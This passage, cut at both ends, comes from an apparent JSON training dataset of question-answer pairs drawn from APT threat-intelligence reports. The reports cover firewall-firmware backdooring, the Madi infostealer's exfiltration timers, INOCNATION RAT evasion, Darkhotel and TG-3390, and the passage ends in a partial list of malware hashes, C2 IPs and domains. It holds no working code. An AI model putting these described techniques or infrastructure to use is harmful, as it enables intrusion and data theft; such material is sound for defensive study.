reputation in this field. I enlisted his help in modifying the source code of the main product of company X.\nThe security policies of company Y were very strict: only the system administrators can install software on the workstations, and both incoming and outgoing traffic goes through a proxy server. Luckily, the virus which my associate hacker had written communicates through DNS, which was not actively monitored or filtered. The software from company X was updated on a regular basis, and after three weeks I received a message which indicated that I had access to their workstations.\nI called on my associate hacker once more, but this time for a more advanced task: reprogramming the firmware of the firewalls which company Y produces. He indicated that he needed the help of a contact who installed a backdoor in all firewalls for another 20,000 euros. Now, all I needed to do was wait for the next update of the firmware. I posted some fake security vulnerabilities for the current version of this firmware, to ensure that the firmware would be upgraded timely. And slowly but surely, I gained access to all internal networks of the government.\nI could then route any traffic which flows through any government network through my own computer. I can also read all emails which are sent between government employees internally. I can find vulnerable servers by scanning the networks. In almost all the internal networks, I have found at least one server which I can exploit. I installed backdoors on hundreds of workstations which allows me the ability to monitor email servers, so emails with interesting attachments can be forwarded to me. Additionally, I have obtained login credentials for almost all major government databases.\nEvery day, almost two hundred gigabytes of government secrets are sent to me automatically. This amount is only limited by the amount of bandwidth I can get, and the number of hard disk drives I install. I'm being paid 100 euros per gigabyte of information. I will leave it to you to calculate my hourly wage.\"\n\u00a9 2012\nThe sad truth is that cybercrime is here to stay. A report by the Government Accountability Office indicated that 24 key government agencies in the United States have logged a 650 percent increase in cyber security incidents in 2011 compared to five years ago.\nAccording to a survey by KPMG Netherlands, 49 percent of organisations have experienced some form of cybercrime activity during the past 12 months while the remaining may not even have proper detection measures in place.\nAmong the 49 percent, 10 percent indicated that they have been attacked more than 100 times within the past year. The remaining respondents said they were attacked successfully up to five times last year. Most of the incidents were not covered by the media and are therefore not publicly known.\nRead the text above and answer this question: What role did social engineering and external resources play in the ethical hacker's strategy to compromise the government's IT infrastructure?",
    "output": "Social engineering played a crucial role in the ethical hacker's strategy. He utilized LinkedIn to identify potential targets by searching for employees who mentioned company Y as a client. This allowed him to find a weak link in the supply chain. Additionally, he leveraged external resources by posting a request for help on a hacker forum, offering a financial reward. This enabled him to enlist the assistance of an associate hacker who had the expertise to modify the source code and reprogram the firewall firmware, thereby facilitating the infiltration of the government's IT infrastructure.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "\u2022\nCTU researchers have evidence that the threat group compromised U.S. and UK organizations in the following verticals: manufacturing (specifically aerospace (including defense contractors), automotive, technology, energy, and pharmaceuticals), education, and legal, as well as organizations focused on international relations. Based on analysis of the group's SWCs, TG-3390 operations likely affect organizations in other countries and verticals.\n\u2022 TG-3390 operates a broad and long-running campaign of SWCs and has compromised approximately 100 websites as of this publication. Through an IP address whitelisting process, the threat group selectively targets visitors to these websites.\n\u2022 After the initial compromise, TG-3390 delivers the HttpBrowser backdoor to its victims. The threat actors then move quickly to compromise Microsoft Exchange servers and to gain complete control of the target environment.\n\u2022 The threat actors are adept at identifying key data stores and selectively exfiltrating all of the high-value information associated with their goal.\n\u2022 CTU researchers recommend the following practices to prevent or detect TG-3390 intrusions:\n\u2022 Search web log files for evidence of web server scanning using the URls listed in the Exploitation section and evidence of exfiltration using the User-Agent in the Actions on objective section.\n\u2022 Require two-factor authentication for all remote access solutions, including OW A.\n\u2022 Audit ISAPI filters and search for web shells on Microsoft Exchange servers.\nQ: How does Threat Group-3390 (TG-3390) utilize web server scanning and what specific actions should cybersecurity experts take to detect and mitigate this activity?",
    "output": "Threat Group-3390 (TG-3390) utilizes web server scanning as part of its strategic watering hole campaigns (SWCs) to identify and exploit vulnerabilities in targeted environments. To detect and mitigate this activity, cybersecurity experts should search web log files for evidence of web server scanning using the URLs listed in the Exploitation section of the report. Additionally, they should look for evidence of exfiltration using the User-Agent specified in the Actions on Objective section. Implementing two-factor authentication for all remote access solutions, including Outlook Web Access (OWA), is crucial. Furthermore, auditing Internet Server Application Programming Interface (ISAPI) filters and searching for web shells on Microsoft Exchange servers can help in identifying and removing potential points of entry used by TG-3390.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How might an adversary like OceanLotus use social media to enhance their attack methods, as seen in the recent APT report involving the Glitch platform?",
    "output": "Search Open Websites/Domains: Social Media is a technique used by adversaries to gather information about victims from social media sites. This can include business announcements, staff roles, locations, and interests. In the case of the OceanLotus group, they may use social media to gather information about potential victims, such as employees who may be more likely to open malicious attachments or click on suspicious links. They could also use social media to spread misinformation or create fake profiles to elicit specific information from victims. Furthermore, they may use social media to establish operational resources, such as creating fake accounts or compromising existing ones, to facilitate their attacks. As seen in the recent APT report, the attackers used a misinformation document with the same content in both campaigns, which could have been spread through social media channels. Additionally, the attackers used the Glitch platform to host their C2 service, which could have been discovered through social media searches. Therefore, it is essential for organizations to be aware of the risks associated with social media and to educate their employees on how to identify and avoid potential threats.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Timer 9: Check for files ready to be uploaded\nInterval: 5 seconds\nTimer 9 is disabled. If either Timer 19 or Timer 20 is enabled, it means there is already an active exfiltrating task. Timer 9 is enabled and it returns.\nOtherwise, Timer 9 searches for files *.*KILOP as well as *.htm.BMH* files in the malware directory. KILOP files are Base64 encoded versions of files to exfiltrate. If no file is found, Timer 9 is enabled and returned.\nIf files are present, they are ready to be exfiltrated, and Timer 19 is enabled. Before returning, Timer 9 is enabled.\nMedium Headline: Timer 19: Check if IE instrumentation has been used to visit the upload page.\nInterval: 25 seconds\nTimer 19 searches for a specific page title:\nIf the page title \"new title hastam - Microsoft Internet Explorer\" is found, Timer 19 returns.\n\"OKshodiha - Windows Internet Explorer\" means a file is ready to be uploaded \u2013 Timer 20 is enabled and\nreturns.\nIf none of those captions are found, Timer 19 starts IE_Instrumentation and visits the Sendfilejj.html page, enables Timer 20, then returns.\nMedium Headline: Timer 20: File upload\nTimer 20 searches for *.*KILOP files, computes the BOTID (see Timer 1 for details), and fills the POST parameters. The \"S0\", \"S1\" and \"S2\" forms present in the Sendfilejj.html are \"filled\" and the file is uploaded using IE Instrumentation.\nT3, is the BOTID+Folder used for uploading (see below)\nT2 is the file name\nT1 is the Base64 encoded content of the file.\nTo compute T3, the following folder is appended to the BOTID (each victim has a root folder named after the BOTID on the C&C).\n\"/Pi/\" for .jpg.BMH - Screen Captures\n\"Te/ for .htm.BMH - Keylogger logs\n\"/So/ for .wav.BMH - Audio Recordings\n\"/Fi/\" for important.file.BMH\n/Fi/CoolDisk/\" for .fildik.BMH (data stolen from removable drives)\nFiles are sent via the Sendfilejj.html page hosted on the C&C, which is a wrapper for the \"sik.php\" script used to receive exfiltrated data.\nAnswer this question: How does the Madi Infostealer ensure that files are ready for exfiltration and subsequently uploaded? Describe the roles of Timers 9, 19, and 20 in this process.",
    "output": "The Madi Infostealer uses a series of timers to manage the exfiltration of files. Timer 9 checks for files ready to be uploaded by searching for files with extensions *.*KILOP and *.htm.BMH* in the malware directory. If such files are found, Timer 19 is enabled. Timer 19 then checks if Internet Explorer instrumentation has been used to visit the upload page by looking for specific page titles. If the title 'OKshodiha - Windows Internet Explorer' is found, it indicates a file is ready to be uploaded, and Timer 20 is enabled. Timer 20 handles the actual file upload by searching for *.*KILOP files, computing the BOTID, filling the POST parameters, and uploading the files using IE Instrumentation through the Sendfilejj.html page hosted on the C&C server. This page acts as a wrapper for the 'sik.php' script, which receives the exfiltrated data.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "April 30, 2021 | 7 minute read\nThe (<https://www.cybereason.com/blog/authors/cybereason-nocturnus>)Cybereason Nocturnus Team has been tracking recent developments in the RoyalRoad(<https://nao-sec.org/2020/01/an-overhead-view-of-the-royal-road.html>) weaponizer, also known as the 8.t Dropper/RTF exploit builder. Over the years, this tool has become a part of the arsenal of several Chinese-related threat actors such as ,  and (<https://malpedia.caad.fkie.fraunhofer.de/actor/ta428>)TA428, all of which  employ RoyalRoad regularly for spear-phishing in targeted attacks against high-value targets.\nWhile analyzing newly discovered RoyalRoad samples observed in-the-wild, the Nocturnus Team detected one that not only exhibits anomalous characteristics, but also delivers PortDoor malware, a previously undocumented backdoor assessed to have been developed by a threat actor likely operating on behalf of Chinese state-sponsored interests.\nAccording to the phishing lure content examined, the target of the attack was a general director working at the (<https://en.wikipedia.org/wiki/Rubin_Design_Bureau>)Rubin Design Bureau, a Russian-based defense contractor that designs nuclear submarines for the Russian Federation's Navy.\n\nAnswer this question based on the above context: Why did the Cybereason Nocturnus Team consider the newly discovered RoyalRoad sample significant, and how does it relate to the PortDoor malware and its potential impact on the Russian defense sector?",
    "output": "The Cybereason Nocturnus Team considered the newly discovered RoyalRoad sample significant because it exhibited anomalous characteristics and delivered PortDoor malware, a previously undocumented backdoor. This malware is believed to have been developed by a threat actor likely operating on behalf of Chinese state-sponsored interests. The significance lies in the fact that the phishing lure content indicated the target was a general director at the Rubin Design Bureau, a Russian-based defense contractor designing nuclear submarines for the Russian Federation's Navy. This highlights the potential for state-sponsored espionage aimed at high-value targets within the Russian defense sector.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: 9. The Russian Federation\nIn this article study several cyber attacks have been attributed to Russia. Regardless of whether the government of Russia is responsible for the attacks, or merely sanctioned them, for many the perception remains that Russia was behind the cyber attacks. I will examine Russia's use of cyber warfare against former Soviet satellite states. (Davis, 2009)\nThe Russian government views itself as the victim in the case of the cyber attacks on Estonia in 2007. According to sources in the Kremlin the website of the President of Russia came under a cyber attack. This was supposedly the largest attack the Russians have faced and it appeared that the servers used to originate the attack were located in the Baltic States. The Deputy Press Secretary of the Russian President, Dmitry Peskov, countered accusations from Estonia with the fact that Russian government websites are under attack every day from all over the world. (The Baltic Times, 2007a)\nEven as cyber attacks occurred against Georgia, Russians said that they were also the victims of cyber attacks. Russia Today, a major media source in Russia, was shut down because of a denial of service attacks directed towards its websites. IT security specialists that work for Russia Today believe that the denial of service attacks originated from Tbilisi, the capital of Georgia. (Watson, 2008)\nIn the aftermath of the cyber attacks on Estonia, Georgia, and other attacks mentioned in this article, the Russian response was to deny any involvement in any cyber attack. When confronted with evidence that some of the attacks originated from Russian government computers members of the Russian government countered with the fact that computers from all over the world were hijacked and used to attack different computer systems. (The Baltic Times, 2007a)\nAnother fact that Russian officials are quick to point out is that the only person arrested for the 2007 cyber attacks on Estonia was an Estonian. Dmitri Galushkevich, a 20 year old ethnic Russian, who was convicted for the cyber attacks. Some members of the Estonian government have issued statements doubting the involvement of the Russian government in the cyber attacks. (Greenberg, 2008)\nWith the finger pointing that ensues after a cyber attack it is still unclear who was behind the attacks. The actions of cyber activist groups, or hactivists, will be examined in the case of the cyber attacks on Estonia and Georgia. Hactivists are individuals that use cyber attacks to take a patriotic or political stand on a political or international issue. (Melikishvili, 2008/2009)\nDuring the protests in Estonia, increased chatter and postings on how to conduct and participate in denial of service attacks were found on Russian internet chat sites (Melikishvili, 2008/2009). Along with the denial of service attacks, some of the Estonian government websites were hacked in order to deface the site. The sayings on the websites were very pro Russian and very anti Estonian. Joshua Davis in Wired Magazine supports the view that the reason behind the attacks was nothing more than Russian pride. (Davis, 2009)\nIn March of 2009 a member of a Russian pro-Kremlin youth group, Konstantin Goloskokov, publicly took responsibility for creating the 2007 cyber attacks on Estonia. Goloskokov is a leader of the youth movement Nashi that has routinely conducted cyber attacks and intimidation campaigns on behalf of the Russian government. The government of the Russian Federation is able to maintain separation from the youth group because it does not directly fund their activities. The youth groups are funded by pro-government business owners who are trying to gain favour from the Russian government (Shachtman, 2009). Goloskokov believes that his actions were not illegal but were, \"an act of civil disobedience organized within the confines of virtual space\" (Buranov, Vodo & Yegikyan, 2009). The cultural aspects or belief that actions in the cyber world are beyond the law is a consequence for the Russian government and how cyber attacks affect their international relationships.\nAn assistant to Sergei Markov, a member of Russia's State Duma lower house, has also admitted to using his own initiative to conduct cyber attacks against Estonia (Baltic News Service, 2009). Rein Lang, the Estonian Justice Minister, is contemplating issuing a European arrest warrant for individuals who have admitted to taking part in the attack. The idea for the warrant is not to send law enforcement officials into Russia, but to have the alleged perpetrators arrested whenever they leave the country (Baltic News Service, 2009). Aleksandr Gostev, director of the Kaspersky Lab's Global Research and Analysis Team, explains that hackers who participate in a distributed denial of service attack violate the Russian Criminal Code (Article 274, Violation of the Rules Governing the Use of Computers, Computer Systems, or Networks Thereof) and can be imprisoned for four years for violating the code. But he also states that the article is rarely used (Buranov, Vodo & Yegikyan, 2009). The examples of Russian citizens admitting to participating in the Estonian cyber attacks are grounds for\nRussian citizens to be arrested in other parts of Europe if Russia fails to uphold its own laws.\nSimilar actions occurred in the Georgian cyber attacks. Messages were posted on Russian hacker forums on how to participate in shutting down Georgian websites. The website StopGeorgia.ru was also established as a private forum to coordinate the denial of service attacks. Jeff Carr, a network security expert and cyber analyst, established an all volunteer group to investigate the cyber attacks. Throughout the course of the investigation, which they named Project Grey Goose, no evidence was found to implicate the Russian government. This was just another example of a hactivist movement which had the collective power to conduct a cyber attack against a government. (Melikishvili, 2008/2009)\nThe Project Grey Goose investigation has looked at hactivists and how they can independently conduct cyber attacks. It also focused on a criminal gang known as the Russian Business Network (R.B.N.). The R.B.N. is based in St. Petersburg and engages in criminal cyber activities. According to Don Jackson, the director of threat intelligence at Secure Works, some of the cyber attacks used against Georgian websites originated from computers under the control of the R.B.N. As is the case with any cyber attacks it is very difficult to establish who is completely responsible or if there is any Russian government sanctioned involvement. (Markoff, 2008a)\nThis article has already noted that there are other groups involved with cyber attacks against former Soviet satellites. The evidence of Russian government involvement will now be investigated (Davis, 2009). Indeed, some statements made by Russian government officials suggest Russian government involvement in cyber attacks. Prior to the cyber attacks in Estonia the Russian government protested the movement of the Russian memorial, the Bronze Soldier, to the Estonian government. The Russian government warned how disastrous the move would be to Estonia. What followed were the protests and the cyber attacks. (Davis, 2009)\nThe head of the Russian Army Centre for Military Forecast, Colonel Anatoly Tsyganok, made comments to the Russian news outlet, Gazeta, about the cyber attacks on Estonia. He believes that there was nothing wrong with the attacks because there are no international agreements established. Colonel Tsyganok also believes that NATO couldn't do\nanything to stop the attacks, and that they were highly successful. (prygi.blogspot.com, 2008)\nThe most telling example of Russian government involvement in cyber warfare was with Herman Simm selling IT secrets to the Russian Foreign Intelligence Service that was discussed earlier in this article. This examples shows that the government of the Russian Federation is actively seeking information on cyber defences and is willing to pay large sums of money (Mr. Simm is accused of selling cyber security secrets for millions of dollars) to receive information on cyber security. (Melikishvili, 2008/2009)\nThere are also cases where cyber attacks were used against people who are in opposition to the Russian government. One such example is with Gary Kasparov, Russian opposition party leader, had his website shut down for two weeks due to denial of service attacks during the Russian presidential campaign. John Palfrey, a researcher at Harvard Law School, believes that several organizations in Russia who plan to protest, or act in opposition to the Russian government, are subjected to cyber attacks in an attempt to control the information that is getting to the public. (Greenberg, 2008)\nAnother example of Russian government complicity is the lack of assistance or interest in tracking down those responsible for the cyber attacks against governments of former Soviet satellites (Davis, 2009). The evidence of government involvement remains circumstantial, but certain facts are clear concerning cyber security and former Soviet satellites. If there is opposition to Russian Federation policy than that country that is in opposition is likely to be subject to a cyber attack and it has been shown that the Russian Federation actively collects information on other countries cyber defences.\nQuestion: How did the Russian government respond to accusations of involvement in the 2007 cyber attacks on Estonia, and what counterarguments did they present?",
    "output": "Answer: The Russian government denied any involvement in the 2007 cyber attacks on Estonia. They countered the accusations by stating that Russian government websites are under attack every day from all over the world. Additionally, they pointed out that the only person arrested for the attacks was an Estonian citizen, Dmitri Galushkevich. Russian officials also argued that computers from various locations were hijacked and used in the attacks, making it difficult to pinpoint the true culprits.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: By William C. Ashmore* (<>)\nDuring a two week period in April and May of 2007 Estonia was the victim of a sustained massive cyber attack on its information infrastructure. While the cyber attack was not the first nor was it the largest, it was the first cyber attack that was directed at the national security of a country. (Davis, 2009)\nThe significance of a cyber attack on a small country can be difficult to measure for a casual observer. Estonia is a small country that can be seen as a model for the future. Estonians have developed and used internet technology for voting, education, security and banking (ninety-five percent of banking operations are done electronically) (Collier, 2007). It is not uncommon to see a sign for free Wi-Fi internet access at a pub, restaurant or on public transportation.\nImagine going to an Automated Teller Machine (ATM), while on a business trip, to get money for meals and lodging and the system is down. Restaurants and hotels are unable to process your credit card. You try to send a message to your bank, your work, and your family but the computer servers are all down. The government is unable to communicate with the public and its different departments. News agencies are having difficulties publishing information. The aftermath of a cyber attack can impact anyone that uses the internet, whether it is an individual, business, or government that has been affected. By investigating the attack, how it happened, and Estonia's reaction, states can decide whether their internet defences and strategies are adequate.\nThe cyber attacks on Estonia have implications for both its allies and adversaries. This article is not meant to establish a complete strategy for cyber defence but to create a better understanding of how a cyber attack can have far reaching consequences beyond the immediate aftermath of a targeted infrastructure. What are the implications for Estonia? Is the framework of the North Atlantic Treaty Organization (NATO) appropriate for cyber defence? Is an attack against one really an attack\nagainst all? Does the Organization for Security and Co-operation in Europe (OSCE) have the ability to react to cyber attacks? Lastly, does the Russian Federation have a coherent cyber strategy that it is willing to use and what have been the consequences for Russia?\n* William C. Ashmore is a Major in U.S. Army.\nAny country that uses the internet as part of its infrastructure needs to be aware of the vulnerabilities and consequences of a cyber attack on their system. A coherent strategy must include internet defences that are set-up in conjunction with technical defences. Currently, legal definitions for cyber crimes do not exist in all countries. The international community must examine treaties and update them to better define assistance and common defence in the event of a cyber attack. Russians have shown the ability and the desire to use cyber warfare. Cyber strategy by, in defence of, or against Russia affects more than computer networks. Although, attacks that originate in China, Japan or the United States may have similar implications they are outside of the scope of this article.\nInternet attacks occur on a daily basis throughout the world. How nations prepare themselves for an internet attack will determine the impact of a cyber attack on their infrastructure. The aim of this article is to achieve a greater understanding of the possible Russian cyber strategy and to understand the counter measures that can be used to prevent or mitigate cyber attacks. This awareness could possibly prevent a tactical defeat during conflict when a cyber attack targeting command and control and communications infrastructure is blocked.\n\nBased on the above text, answer a question. What key considerations should states evaluate when assessing their internet defenses and strategies in light of the cyber attack on Estonia?",
    "output": "States should evaluate several key considerations when assessing their internet defenses and strategies. Firstly, they should investigate how the attack occurred and understand the methods used to compromise the infrastructure. Secondly, they should examine Estonia's reaction to the attack to gauge the effectiveness of their response mechanisms. Additionally, states need to consider the implications for their allies and adversaries, including whether their current frameworks, such as those within NATO or OSCE, are adequate for cyber defense. They should also assess if existing legal definitions for cyber crimes are sufficient and whether international treaties need updating to better define assistance and common defense in the event of a cyber attack. Finally, states must recognize the potential for cyber warfare strategies employed by actors like Russia and develop countermeasures to prevent or mitigate such attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Fidelis Threat Advisory #1020\nDissecting the Malware Involved in the INOCNATION Campaign\nAs the findings of a new malware attack campaign named  emerged, Fidelis Threat Research investigated the Remote Access Tool (RAT) used in this campaign. We discovered some interesting characteristics. This particular RAT employs simple and cunning techniques to prevent its discovery or further investigation. The embedded anti-analysis techniques and other capabilities introduce tradecraft that is integrated directly into the malware's layers. Specifically we found that the malware utilized the following techniques:\nf fDifferent types of XOR techniques to obfuscate components and its contained strings\nf fThe use of trusted security software as a decoy during initial infection\nf fSandbox detection\nf fA mangled MZ header to deceive security products\nf fString Stacking obfuscation with Unicode Strings\nf fMore than one layer of obfuscation for its command and control traffic\nf fUn-Install functionality\n\nQuestion: How does the INOCNATION campaign's Remote Access Tool (RAT) employ anti-analysis techniques to evade detection and what specific methods does it utilize?\n\nAnswer:",
    "output": "The INOCNATION campaign's Remote Access Tool (RAT) employs several anti-analysis techniques to evade detection. These techniques are integrated directly into the malware's layers and include different types of XOR techniques to obfuscate components and its contained strings, the use of trusted security software as a decoy during initial infection, sandbox detection, a mangled MZ header to deceive security products, string stacking obfuscation with Unicode strings, more than one layer of obfuscation for its command and control traffic, and un-install functionality.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How did Suck\u00d3y leverage open-source information to facilitate their initial breach into the e-commerce company's internal network?",
    "output": "Suck\u00d3y identified a user to target by leveraging open-source information. The targeted employee had a significant online presence, including details about their job function, corporate email address, work-related projects, and a publicly accessible personal blog. This information likely facilitated the initial breach, potentially through a spear-phishing email, although the exact delivery vector is unknown.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "APT Trends Report Q2 2018\nBy GReAT\nIn the second quarter of 2017, Kaspersky Lab's Global Research and Analysis Team (GReAT) began publishing summaries of the quarter's private threat intelligence reports, in an effort to make the public aware of the research we have been conducting. This report serves as the latest installment, focusing on the relevant activities that we observed during Q2 2018.\nThese summaries are a representative snapshot of what has been discussed in greater detail in our private reports. They aim to highlight the significant events and findings that we feel people should be aware of. For brevity's sake, we are choosing not to publish indicators associated with the reports highlighted. However, readers who would like to learn more about our intelligence reports or request more information on a specific report are encouraged to contact: .\n\nAnswer this question based on the above context: How does the publication of summaries by Kaspersky Lab's Global Research and Analysis Team (GReAT) contribute to enhancing the awareness and preparedness of cybersecurity experts against advanced persistent threats (APTs)?",
    "output": "The publication of summaries by Kaspersky Lab's Global Research and Analysis Team (GReAT) contributes to enhancing the awareness and preparedness of cybersecurity experts by providing a representative snapshot of significant events and findings from their private threat intelligence reports. These summaries highlight relevant activities observed during specific periods, such as Q2 2018, making the public aware of the research conducted. By sharing these insights, GReAT aims to inform the broader cybersecurity community about emerging threats and trends, enabling experts to stay informed and better equipped to deal with similar attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Introduction\nWhen unsuspecting guests, including situationally aware corporate executives and high-tech entrepreneurs, travel to a variety of hotels and connect to the internet, they are infected with a rare APT Trojan posing as any one of several major software releases. These might be GoogleToolbar, Adobe Flash, Windows Messenger, etc. This first stage of malware helps the attackers to identify more significant victims, leading to the selective download of more advanced stealing tools.\nAt the hotels, these installs are selectively distributed to targeted individuals. This group of attackers seems to know in advance when these individuals will arrive and depart from their high-end hotels. So, the attackers lay in wait until these travelers arrive and connect to the Internet.\nThe FBI issued advisories about similar hotel incidents; Australian government officials produced similar, newsworthy accounts when they were infected. While an FBI announcement related to attacks on hotel guests overseas appeared in May 2012, related Darkhotel samples were already circulating back in 2007. And available Darkhotel server log data records connections as early as Jan 1, 2009. Additionally, seeding p2p networks with widely spread malware and 0-day spear-phishing attacks demonstrate that the Darkhotel APT maintains an effective toolset and a long-running operation behind the questionable hospitality it shows its guests.\n\nQ: How does the Darkhotel APT group manage to target specific individuals at high-end hotels, and what strategies do they employ to ensure the effectiveness of their attacks?",
    "output": "A: The Darkhotel APT group manages to target specific individuals at high-end hotels by knowing in advance when these individuals will arrive and depart. They lay in wait until these travelers arrive and connect to the internet. The group employs a strategy where they infect unsuspecting guests with a rare APT Trojan disguised as popular software updates like Google Toolbar, Adobe Flash, or Windows Messenger. This initial infection helps the attackers identify more significant victims, leading to the selective download of more advanced stealing tools. The group's effectiveness is further enhanced by their use of widely spread malware on p2p networks and 0-day spear-phishing attacks, demonstrating a robust toolset and a long-running operation.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Cluster 1 IOCs\nCrimson Downloader Samples 032bacaea0d335daec271f228db6bc88 052eb62056794a08a04f4cd61455602c 06c18c72f9f136bacc5c9b0d8fa93195 0a8d414eb910eb4caeb96a648b70eef3 0b651ef0eb7b919e91a2c5c5dbccd27e 0ed7f485166796e10bcb9123de24d211 17dbd878985b78848d4a3a758a3ef89c 1af4df1382c04677050379ccdafcafd2 21fc043b31d22b5c3f5529db83e90422 2c9cc5a8569ab7d06bb8f8d7cf7dc03a 340f31a36e159e58595a375b8b0b37b2 34ad98510d4d6e24b7e38f27a24ad9f6 3a67ebcab5dc3563dc161fdc3c7fb161 3b08095786731c522f5649081f8dbb7e 3cc848432e0ebe25e4f19effdd92d9c2 41a0e4f9745e4bd5ad7b9d500deb76fa 428371be27fc057baac3ea81a8643435 535888163707b60c1a8dfefffad70635 53c10ac66763739b95ac7192a9f489ad 5b6beb9ee6e604f4e474b8129e6135f4 5c6b401979469040b39babb0469fc0c8 5d038817ffeab7715415d68d438af345 5ff65fdefe144800e43a2f6cc6244c75 6c3b38bf90a203b2f7542d0359b8e60e 6d2442494c3019f1597256cbeb45e5f6 6eb40b2e6a67a785d5cc6e4ad9102b5d 7289c160582f010a3c7dbd512c5d8a09 75b390dc72751a062e8106328450ef87 796ae0b75c0e0b08ea84668495df4070 7a6b88e43cccc8133c066b87f72c53f7 803d2758c3b89882e2d41867768d7b15 83a8ce707e625e977d54408ca747fa29 85e2c950ddb18fe1dd18709cfbb9b203 94770186027a0ccdf733b72894a0c7d0 9d4504cdb7b02b9c9fffefcf9b79101d ac637313520ca159a02d674474d341ef b67411da3ddfcae9f2a20935619e5c4a b8098acf09d121ab298351f0c804ef8b bf1400105c97a28fefd33d8c0df5d4c1 c61061a40dba411b839fe631299c267a ca27cefe404821ccd8dc695da55102e8 cdc6bb98a2629338d49587d186562fd3 dac4f8ba3190cfa1f813e79864a73fe1 df6b3946d1064f37d1b99f7bfae51203 e3254ad0275370f92cffeacbf603a905 e456d6035e41962a4e49345b00393dcd edccbc7f880233de987ba4e917877df2 eee91d8de7ea7c0ac3372f65c43e916a\nCrimson Downloader Droppers\n9e0fef5552100a7e0a2d044b63736fb2 7470757050f584101a851d7ba105db31\nCrimson SecApp Samples 07defabf004c891ae836de91260e6c82 0ad849121b4656a239e85379948e5f5d 0ed7f485166796e10bcb9123de24d211 1911c1234cc2918273baeffd7d37392e 2d6d0dbd8ac7c941d78ba14289a7ab9d 43b39b40605afb9d2624f1cede6b48a8 65f6143d69cb1246a117a704e9f07fdc 723d85f905588f092edf8691c1095fdb 765f0556ed4db467291d48e7d3c24b3b 9b3cb979b1397a4a13ea62dbf46510d8 9fcc3e18b9c0bd7380325f24a4623439 b4080cda4fb1b27c727d546c8529909c ca77af41cbd8c2fd44085d0d61bac64b df6be8accc487bf63260aacf5e582fe2\nCrimson RAT Samples 073889fe855f401c3c4cc548bc08c502 0964887f6f709f9c3f11701412acb9c1 14be26aa207cff81ff814c8a7a8e2f03 19b9f62f29f3689b1db4c56deed7e162 1a1426a94e37e5f3c14cd2b6740e27e1 3ff165ee68d1bc03ae7d4d3baf99b963 4297041e3a701ed8c01e40d6c54264a1 43f47d2045ca98265fd4bd4011a04932 463565ec38e4d790a89eb592435820e3 5371d2984cbd1ae8283f9ae9eeee718d 53a60acc6a09a7fa2eebf4eb88c81af5 59e0fc469d1af7532507c19b47f19960 6746c430f978d0bc9bbecff87c651fa2 71b4bbddf46e1990210742a406c490bf 7e42de66eee8d280a3ba49d5b979c737 811eb99fb1aca98052db4b78c288889c 819715180810caaaa969c816eb2b7491 8317bb3d192c4495507a5945f27705af 8c713cffdc599930a9236c2d0d0ee91a 92f78a182faf26550d6fab2d9ec0692d 943f35200dce22766d0c2906d25be187 94d29dded4dfd920fc4153f18e82fc6c 9fd2838421b28674783b03eb46f4320f a3aa3a12d81c9862b18f83a77d7215ca bcbac2241977c976aec01592fb514aa4 c2bc8bc9ff7a34f14403222e58963507 cb0768c89e83f2328952ba51e4d4b7f1 d53de7c980eb34f9369e342d5d235c9b e7803020e9697d77f165babecf20ea82 eaee83a376914616924eab9b4b96b050 ed1daf18ef09fb2a5c58ab89824ecab0 f078b5aeaf73831361ecd96a069c9f50 fe955b4bbe3b6aa2a1d8ebf6ee7c5c42\nCrimson C&C\n5.189.143[.]225\n5.189.167[.]65\n80.241.221[.]109\n93.104.213[.]217\n193.37.152[.]28\n213.136.87[.]122\nPeppy RAT Samples\n010a50145563a6c554de12b8770f16f7 010aa8d6e6f5346118546b1e4e414cb2 131b4ed3df80e2f794a3e353e2c7f8fb 17d22686bfc825d9369a0751c4cc6a22 1d49dc6af6803d9ffc59a859315b2ac4 22192141d2010fe9fed871d05573dda4 23ec916b3eae3f88853bde8081be870f 2463d1ff1166e845e52a0c580fd3cb7d 2cff1578ac42cc0cd5f59e28d6e7240f 31a9e46ff607b842b8fff4a0644cc0f4 3540f2771b2661ecbd03933c227fb7f7 3b979fd0a8fa0ecbc334a3bbbfb68a36 4a717b657ea475197d967008c7db8353 511bcd411ec79c6ca555670e98709e46 5998641f454f82b738977aa8b3d1d283 725379749d3fa793edcce12291782134 77c7c0117a0e457d7e3ceef4ab82c2ca 7920862303764a55050d2da38b8bf4db 858a729819cc082f2762b6d488284c19 86e27e86e64031720a1ca52d2fbb7c98 af5e96e260b71356d62900551f68f338 b04117ee18182c1c07ffaf6fb35b08bc c33c79c437d94fad3476f78361df0f24 c9e4c816b4ef23c28992e0e894b9c822 ee5a460ded205d2074a23e387c377840 f13a1a0cbcd5e13dd00dbc77c35973ef f6d141f45e76cefcb712f69c193b3ac1 f8955450fbd62cb4461c725d8985ff60 fa97cba6a52896e1f2146957a6eec04f fab5eff5fc65a7a2c5920586df5e29c2\nPeppy RAT Domains applemedia1218.com avssync3357.com bbmdroid.com bbmsync2727.com bluesync2121.com eastmedia1221.com eastmedia3347.co.cc eastmedia3347.com facemedia.co.cc kssync3343.com kssync3347.co.cc kssync3347.com mahee.kssync3343.co.cc mvssync8767.com\nstudent3347.mooo.com winupdater2112.com\nAndromeda Samples\n0123411a6cfe8afb4a45e4afeed767e7 114551a87fa332a243fc05b7246309b9 128c0ccc1252098bc2314d88f4e70044 133e0c441ea744951080d700604a63ee 1f97ddaea7ac0c4e20b2db75969b4545 4b0481a591c87e8542e2089396a10d3c 7ec3ec88185f9c235e2d3da7434b928a 878aa68245675ca5ea677aaf28707b7a 990c3b67061109d82627a5642bf1bb68 a4ce604f8d3ac2e5facdae3c63ef4dc6 a6d75b57bd597e723335f96f074f5700 a6ef041311497bcddb8818b5a4f6c90e ae2ef98a91c70dc43979ce7df8e475ad 